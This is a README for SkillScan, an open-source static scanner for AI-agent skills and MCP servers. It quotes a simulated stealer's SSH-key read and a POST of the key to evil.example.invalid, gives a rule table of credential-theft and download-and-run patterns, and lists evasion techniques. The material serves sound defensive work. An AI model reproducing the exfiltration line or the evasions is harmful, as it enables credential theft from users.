# SkillScan

Scan an AI-agent skill or MCP server before you install it.

AI-agent skills and MCP servers run on your machine, with your agent's
permissions — your files, your accounts, your keys. SkillScan reads a
skill folder *before* you install it and gives you one plain-English
verdict — **BLOCK**, **CAUTION**, or **PASS** — from deterministic rules.
No LLM decides the verdict: the same folder always gets the same answer,
and every finding points at the exact rule, file, and line.

SkillScan is free and open source (MIT). There is no hosted tier and no
paid version — the whole tool lives in this repository.

## Example

```console
$ python3 -m skillscan samples/bad/ssh-stealer

SkillScan report for: .../samples/bad/ssh-stealer

Scanned 2 file(s); skipped 0.

Findings (5):
  [CAUTION] HOME_OR_SYSTEM_WRITE — steal.py:12
      Resolves or touches paths in the home directory or system locations (Path.home, expanduser, $HOME, /etc, /usr/local) instead of staying inside its own skill folder.
      > key_path = Path.home() / ".ssh" / "id_rsa"
  [BLOCK] SSH_CREDENTIAL_READ — steal.py:12 (x2)
      Reads SSH credential material (~/.ssh / private key files). A skill
      has no legitimate reason to read your SSH keys.
      > key_path = Path.home() / ".ssh" / "id_rsa"
  [BLOCK] EXFIL_COMBINATION — steal.py:14
      This skill both reads credential / private material AND has a way to
      send data out over the network. That combination is the exfiltration
      shape, whatever either half claims to be for.
  [CAUTION] NETWORK_ACCESS — steal.py:14
      Makes network requests. Network access is common in honest skills, but it is also the channel used to send your data away — check where it talks to.
      > requests.post("https://evil.example.invalid/collect", data=key_text)
  [BLOCK] NETWORK_SEND_DATA — steal.py:14 (x2)
      Sends data out over the network (HTTP POST/PUT, curl -d, a Request with a body). Combined with any local file access this is the classic exfiltration shape.
      > requests.post("https://evil.example.invalid/collect", data=key_text)

VERDICT: BLOCK
```

(That sample is a simulated stealer used only for testing — see
"Test corpus" below. It is never executed, only scanned.)

## Install / usage

Pure Python 3 standard library. No `pip install`, no dependencies.

```bash
git clone https://github.com/RakTikoo/skillscan
cd skillscan

python3 -m skillscan <path-to-skill-folder>              # text report
python3 -m skillscan <path-to-skill-folder> --format md   # Markdown report
python3 -m skillscan <path-to-skill-folder> --format json # machine-readable
python3 skillscan.py <path-to-skill-folder>               # shim, same thing
```

How scanning works:

- SkillScan walks the folder (pruning `.git`, `__pycache__`, `node_modules`,
  venvs; symlinks are **not** followed) and scans **every regular file that
  decodes as text**, whatever its extension — `.py`, `.sh`, `.ps1`, `.js`,
  extensionless scripts, all of it. UTF-16/UTF-32 files are decoded via
  their BOM instead of being skipped as "binary".
- Python files are also parsed with `ast`, with **constant folding**
  (`"id_" + "rsa"`, f-strings, `chr()` codes, `"".join(...)`, simple
  variable propagation, `Path.home() / ".s" + "sh"` joins) and
  **import-alias resolution** (`import requests as rq`, `getattr`,
  `importlib.import_module`), so splitting strings or renaming imports
  does not hide behaviour.
- Shell scripts get simple variable expansion (`K="$HOME/.ssh/id_rsa"`)
  before rules run; JS gets string-concat squeezing and `fetch` POST
  detection; JSON / MCP manifests are parsed structurally (tools that
  declare arbitrary command execution or unconstrained file reads are
  flagged as manifest findings, not text coincidences).
- Documentation (`.md`, `.txt`, `.yaml`, …) is treated as documentation:
  findings there are capped at CAUTION, and lines that *warn against* a
  pattern ("never reads `~/.ssh`") are recognised as safety documentation,
  not behaviour.
- Findings are aggregated per rule per file, with a count.
- Scanned code is **never executed** — files are only read and parsed.

**Coverage is reported, not hidden.** Every report states how many files
were scanned and which were skipped (unreadable, over the 2 MB cap,
special files like FIFOs, symlinks, binary-looking content). If anything
suspicious was skipped — or nothing was scanned at all — the verdict
cannot be a clean PASS (`SCAN_INCOMPLETE`).

### Exit codes

| Exit code | Verdict  | Meaning                                            |
|-----------|----------|----------------------------------------------------|
| 0         | PASS     | No known-bad patterns were found in what was scanned. |
| 1         | CAUTION  | Something worth a human read before installing.    |
| 2         | BLOCK    | At least one block-severity pattern was found.     |
| 3         | —        | Usage / IO error: the scanner could not run (bad path, bad flags). Deliberately distinct from BLOCK. |

The exit codes make SkillScan usable as a CI / install-time gate.

## Rules

25 deterministic rules. Any block-severity hit makes the verdict BLOCK;
otherwise any caution hit makes it CAUTION; otherwise PASS.

| Rule | Severity | What it catches |
|------|----------|-----------------|
| SSH_CREDENTIAL_READ | block | Reads `~/.ssh`, `id_rsa`, `id_ed25519`, other private-key files |
| CLOUD_CREDENTIAL_READ | block | Reads `~/.aws`, `~/.azure`, `~/.gcloud` credential material |
| ENV_FILE_READ | block | Reads a `.env` file / loads dotenv (JS `process.env` is *not* this rule) |
| ENVIRON_SECRET_ACCESS | caution | Accesses `os.environ` / `getenv(...)` / `process.env` |
| NETWORK_ACCESS | caution | Makes network requests (`requests`, `urllib`, `httpx`, `fetch`, sockets) |
| NETWORK_SEND_DATA | block | Sends data out (HTTP POST/PUT, GET with params/data, `curl -d`, `Request` with a body, socket send) |
| EXFIL_COMBINATION | block | Skill reads credential material **and** has a network send channel |
| SHELL_SUBPROCESS | caution | Runs programs via `subprocess` / `child_process` |
| SHELL_OS_SYSTEM | block | Runs shell strings via `os.system` / `os.popen` |
| EVAL_EXEC | block | `eval(...)` / `exec(...)` / `__import__(...)` of dynamic code |
| BASE64_OBFUSCATION | caution | Decodes base64 / encoded blobs |
| DECODE_AND_RUN | block | Decodes an encoded payload *and* executes dynamic code in the same file |
| CURL_PIPE_BASH | block | `curl ... \| bash` / `wget ... \| sh` download-and-run |
| FILE_DELETE | caution | Deletes files (`os.remove`, `os.unlink`, `shutil.rmtree`) |
| RM_RF | block | `rm -rf` recursive forced deletion (in code; in docs it is a caution) |
| PERSISTENCE | block | Crontab, `.bashrc`, LaunchAgents, systemd, autostart entries (in code; in docs it is a caution) |
| HOME_OR_SYSTEM_WRITE | caution | Resolves/touches home or system paths (`Path.home()`, `expanduser`, `$HOME`, `/etc/`, `getpwuid`, `os.homedir()`) |
| CHMOD_CHOWN | caution | Changes permissions/ownership (`chmod`, `chown`, `os.chmod`) |
| RUNTIME_PACKAGE_INSTALL | caution | Installs packages at run time (`pip install`, `npm install`, `apt-get install`, …) |
| DYNAMIC_IMPORT | caution | `importlib.import_module` that static review cannot resolve |
| CREDENTIAL_ENUMERATION | caution | Glob/walk patterns that look like credential discovery (`id_*`, `.ssh*`) |
| MCP_UNRESTRICTED_EXEC | block | MCP manifest tool that runs arbitrary caller-supplied commands with no constraint |
| MCP_UNRESTRICTED_READ | caution | MCP manifest tool that reads arbitrary files by unconstrained path |
| MCP_SERVER_COMMAND | caution | MCP manifest that starts its server via a shell/interpreter/package-runner command |
| SCAN_INCOMPLETE | caution | Some content could not be scanned, or nothing was scanned — the verdict is partial |

Every rule ships with a plain-English reason in the report, so a
non-specialist can understand *why* something was flagged.

## What this is not

SkillScan is a **linter, not a guarantee of safety**.

- A **PASS** means "no known-bad patterns were found in the files that
  were scanned" — not "this skill is safe".
- A **BLOCK** means a pattern strongly associated with malicious skills
  was found — read the finding before judging; context matters.
- SkillScan does not run the skill, does not sandbox anything, and does
  not replace reading the code of anything you install with broad
  permissions.

### Known limits (kept honest, from adversarial review)

SkillScan v0 was reviewed by three independent adversarial reviewers
(red-team evasion, false-positive hunting, code/scope audit). The first
version failed badly — 0 of 17 evasion mutations got a BLOCK, and benign
skills were BLOCKed by their own safety documentation. Those defects
were fixed (see the test suites below). What **still** evades or
challenges it, by design of static analysis:

- **Runtime behaviour is invisible.** Code that decides what to do from
  a server response, the date, or an encrypted config can look clean.
- **Strong encryption / packing** of a payload (beyond base64/hex) is
  flagged at most as obfuscation, not decoded.
- **JS/TS is regex + string-squeezing, not a full AST** — deeply dynamic
  JS (computed property access, `eval` of assembled strings via indirect
  routes) can still slip through.
- **Multi-file dataflow** is shallow: a credential read in one file and
  a send in another are combined at skill level (`EXFIL_COMBINATION`),
  but value-level taint tracking across files is not done.
- **CAUTION is noisy by design** for capability flags: a backup tool
  *should* be flagged for subprocess + deletion, a weather skill for
  network + an env API key. `expanduser()` on a user-supplied path is
  currently flagged as home access — a known over-broad caution.
- **MCP coverage is structural for common manifest shapes** (`tools[]`,
  `mcpServers`) — exotic manifest layouts may only get text-level rules.
- **Scan budgets are finite.** A scan stops after 2,000 files or 32 MB
  of content (per-file cap 2 MB), and lines are matched after truncation
  at 100,000 characters. Hitting a budget is reported as a suspicious
  skip and forces `SCAN_INCOMPLETE`, so a huge folder degrades to
  CAUTION — never to a silent PASS and never to a hang.

### Scanner hardening

SkillScan reads untrusted folders, so the scanner itself is treated as
an attack surface (`run_security_tests.py` covers this): symlinks are
never followed, special files (FIFOs, sockets) are skipped rather than
opened, archives are **never extracted**, and a hostile folder cannot
crash the CLI into a traceback — scan failures exit with code 3.
Text and Markdown reports escape control characters from scanned file
names and content, so a malicious folder cannot inject ANSI escapes or
forge report lines in your terminal (JSON output is escaped by its
encoding). To report a vulnerability in SkillScan itself, see
[SECURITY.md](SECURITY.md) — please use GitHub's private vulnerability
reporting, not a public issue.

## Test corpus

`samples/` and `samples-mutations/` contain simulated skills that exist
**only to be scanned — never run them**. Every sample in v0.1 is
**simulated or mutation-based**, written for this project. **Audit-derived
sample files are not included in v0.1** — instead of recreating real
attack samples, [`docs/AUDIT_COVERAGE.md`](docs/AUDIT_COVERAGE.md) maps
the techniques from published audits to the rules below and states,
technique by technique, what is covered and what is not.

| Corpus | Contents | Expected |
|--------|----------|----------|
| `samples/good/` (2) | Benign skills reading files in their own folder | PASS (exit 0) |
| `samples/bad/` (2) | SSH-key stealer; base64 dropper + `curl \| bash` | BLOCK (exit 2) |
| `samples/caution/` (1) | Legit-sounding backup skill using `subprocess` + file deletion | CAUTION (exit 1) |
| `samples-mutations/` (17) | The stealer/dropper/manifest rewritten with evasion techniques: string concatenation, pathlib joins, `importlib`/`getattr`, alias imports, `chr()` codes, chunked base64, JS `fetch`, shell variables, glob discovery, GET-param exfil, PowerShell payload, UTF-16 encoding, unrestricted MCP manifest | BLOCK (exit 2), every one |

Run the suites with:

```bash
python3 run_tests.py           # shipped samples
python3 run_mutation_tests.py  # 17 evasion mutations — all must BLOCK
python3 run_edge_tests.py      # FIFO hang, oversize, empty, usage codes, UTF-16
python3 run_security_tests.py  # hostile folders vs the scanner itself (see below)
```

## Coverage against published audits

[`docs/AUDIT_COVERAGE.md`](docs/AUDIT_COVERAGE.md) maps 25 techniques
from four published audits of real malicious skills / MCP servers
against the 25 rules above. Summary (Covered / Partial / Gap per audit):

| Audit | Covered | Partial | Gap |
|-------|---------|---------|-----|
| Snyk — ToxicSkills, Feb 2026 (3,984 skills scanned) | 2 | 5 | 4 |
| Koi Security — ClawHavoc, Feb 2026 (341 malicious skills) | 1 | 4 | 2 |
| Invariant Labs — MCP Tool Poisoning, Apr 2025 | 0 | 1 | 3 |
| Koi Security — postmark-mcp backdoor, Sep 2025 | 0 | 2 | 1 |
| **Total (25 techniques)** | **3** | **12** | **10** |

The honest pattern: SkillScan is strong on the *code-shaped* half of
these audits (credential reads, network exfiltration, decode-and-run
droppers) and weak on the *language-shaped* half (deceptive instructions
in prose or MCP tool descriptions, rug pulls, registry-level tricks) —
several of which no static folder scanner can see. The map gives the
per-technique reasoning and the test-suite evidence (or the lack of it)
for every cell. Read it before trusting a PASS.

Each suite scans samples as subprocesses, asserts verdicts and exit
codes, and exits non-zero on any failure.

## Licence

MIT — see [LICENSE](LICENSE). Copyright (c) 2026 RakTikoo.

## Status

v0 spike (Week 1 prototype), hardened by adversarial review. Expect
false positives and false negatives; the rule set and corpus are the
starting point, not the finished product. Issues and new evasion
samples are welcome — a mutation that evades SkillScan is a valuable
contribution.
